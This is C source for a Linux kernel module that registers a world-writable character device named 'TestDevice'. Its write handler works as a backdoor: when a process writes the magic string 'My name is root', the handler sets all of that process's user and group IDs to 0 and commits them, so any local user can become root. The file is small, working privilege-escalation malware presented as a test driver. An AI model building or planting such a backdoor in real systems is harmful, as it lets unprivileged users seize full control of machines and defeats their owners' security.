#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");

#define DEVICE_NAME "TestDevice"  // name--> appears in /proc/devices
#define CLASS_NAME "Test"         ///< The device class

#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 4, 0)
#define V(x) x.val
#else
#define V(x) x
#endif

static int     dev_open(struct inode *, struct file *);
static int     dev_release(struct inode *, struct file *);
static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);

static int uevent(struct device *dev, struct kobj_uevent_env *env){
  add_uevent_var(env, "DEVMODE=%#o", 0666);
  return 0;
}

static struct file_operations fops = {
    .open    = dev_open,
    .read    = dev_read,
    .write   = dev_write,
    .release = dev_release,
};
static struct device *cdevice = NULL;
struct class *        devClass;
struct cdev *         mcdev;
static int            major;
int ret;  // will be used to hold return values of functions; this is because
          // the kernel stack is very small so declaring variables all over the
          // pass in our module functions eats up the stack very fast
dev_t dev_num;  // will hold major number that kernel gives us

static int __init test_init(void) {
  ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);

  // Create a class which will appear at /sys/class
  devClass = class_create(THIS_MODULE, CLASS_NAME);
  devClass->dev_uevent = uevent;
  
  cdevice  = device_create(devClass, NULL, dev_num, NULL, DEVICE_NAME);

  if (ret < 0) {
    printk(KERN_ALERT "Load failed\n");
    return major;
  }

  major = MAJOR(dev_num);
  printk(KERN_INFO "%s: major number is %d", DEVICE_NAME, major);
  printk(KERN_INFO "\tuse \"use mknod /dev/%s c %d 0\" for device file",
         DEVICE_NAME,
         major);
  mcdev        = cdev_alloc();
  mcdev->ops   = &fops;
  mcdev->owner = THIS_MODULE;

  ret = cdev_add(mcdev, dev_num, 1);

  if (ret < 0) {
    printk(KERN_ALERT "%s: unable to add cdev to kernel", DEVICE_NAME);
    return ret;
  }

  printk(KERN_INFO "Module has been loaded\n");
  return 0;
}

static void __exit test_exit(void) {
  device_destroy(devClass, dev_num);
  cdev_del(mcdev);
  class_unregister(devClass);
  class_destroy(devClass);
  unregister_chrdev_region(dev_num, 1);
  printk(KERN_INFO "Module has been unloaded\n");
}

static int dev_open(struct inode *inodep, struct file *filep) {
  printk(KERN_INFO "Device opened\n");
  return 0;
}

static ssize_t dev_write(struct file *filep,
                         const char __user *buf,
                         size_t             len,
                         loff_t *           offset) {
  
  char *       data;
  char         magic[] = "My name is root";
  struct cred *new_cred;

  data = (char *)kmalloc(len + 1, GFP_KERNEL);
  if (data) {
    copy_from_user(data, buf, len);
    if (memcmp(data, magic, 15) == 0) {
      if ((new_cred = prepare_creds()) == NULL) {
        printk("TEST: Cannot prepare credentials\n");
        return 0;
      }

      printk("TEST: Credentials prepared!");
      V(new_cred->uid) = V(new_cred->gid) = 0;
      V(new_cred->euid) = V(new_cred->egid) = 0;
      V(new_cred->suid) = V(new_cred->sgid) = 0;
      V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
      commit_creds(new_cred);
    }
    kfree(data);
  }
  return len;
}

static int dev_release(struct inode *inodep, struct file *filep) {
  printk(KERN_INFO "Device closed\n");
  return 0;
}

static ssize_t dev_read(struct file *filep,
                        char *       buffer,
                        size_t       len,
                        loff_t *     offset) {
  int   errors      = 0;
  char *message     = "Oh yeah, read my device...";
  int   message_len = strlen(message);

  errors = copy_to_user(buffer, message, message_len);

  return errors == 0 ? message_len : -EFAULT;
}

module_init(test_init);
module_exit(test_exit);
